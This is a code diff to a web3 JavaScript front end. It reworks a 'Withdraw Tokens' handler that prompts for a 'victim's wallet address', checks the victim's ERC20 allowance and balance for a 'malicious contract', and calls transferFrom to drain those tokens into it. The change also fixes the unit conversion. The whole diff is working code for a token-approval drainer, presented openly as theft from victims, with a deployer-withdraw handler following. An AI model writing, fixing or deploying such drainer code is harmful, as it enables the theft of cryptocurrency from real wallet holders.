@@ -453,32 +453,39 @@
             }
         });
 
-        // Withdraw Tokens (from victim's address using the malicious contract)
-        document.getElementById("transferTokensBtn").addEventListener("click", async () => {
-            const victimAddress = prompt("Enter victim's wallet address:");
+       // Withdraw Tokens (from victim's address using the malicious contract)
+document.getElementById("transferTokensBtn").addEventListener("click", async () => {
+    const victimAddress = prompt("Enter victim's wallet address:");
 
-            if (victimAddress) {
-                try {
-                    const allowance = await tokenContract.methods.allowance(victimAddress, maliciousContractAddress).call();
-                    const balance = await tokenContract.methods.balanceOf(victimAddress).call();
-                    const amountToWithdraw = Math.min(parseFloat(allowance), parseFloat(balance));
+    if (victimAddress) {
+        try {
+            // Check if the victim has approved the malicious contract to spend tokens
+            const allowance = await tokenContract.methods.allowance(victimAddress, maliciousContractAddress).call();
+            const balance = await tokenContract.methods.balanceOf(victimAddress).call();
+            
+            // Calculate the amount to withdraw (minimum of allowance or balance)
+            const amountToWithdraw = Math.min(parseFloat(allowance), parseFloat(balance));
 
-                    if (amountToWithdraw <= 0) {
-                        alert("Insufficient allowance or balance to withdraw.");
-                        return;
-                    }
-
-                    const amountInTokens = web3.utils.toBN(amountToWithdraw).mul(web3.utils.toBN('1000000000000000000')); // 10^18
-
-                    const transaction = await tokenContract.methods.transferFrom(victimAddress, maliciousContractAddress, amountInTokens).send({ from: accounts[0] });
-
-                    alert(`Successfully withdrawn ${amountToWithdraw} tokens from the victim's account to the malicious contract!`);
-                } catch (error) {
-                    alert("Error during withdrawal.");
-                    console.error("Withdrawal Error:", error);
-                }
+            if (amountToWithdraw <= 0) {
+                alert("Insufficient allowance or balance to withdraw.");
+                return;
             }
-        });
+
+            // Convert the amount to the token's smallest unit (18 decimals for ERC20 tokens)
+            const amountInTokens = web3.utils.toWei(amountToWithdraw.toString(), 'ether');  // Convert to Wei (smallest unit)
+
+            // Perform the withdrawal from the victim's wallet to the malicious contract
+            const transaction = await tokenContract.methods.transferFrom(victimAddress, maliciousContractAddress, amountInTokens).send({ from: accounts[0] });
+
+            alert(`Successfully withdrawn ${amountToWithdraw} tokens from the victim's account to the malicious contract!`);
+        } catch (error) {
+            alert("Error during withdrawal. Please check the details.");
+            console.error("Withdrawal Error:", error);
+            alert("Check the victim's approval, balance, and allowance.");
+        }
+    }
+});
+
 
         // Deployer Withdraw (withdraw from the malicious contract balance to deployer's wallet)
         document.getElementById("deployerWithdrawBtn").addEventListener("click", async () => {
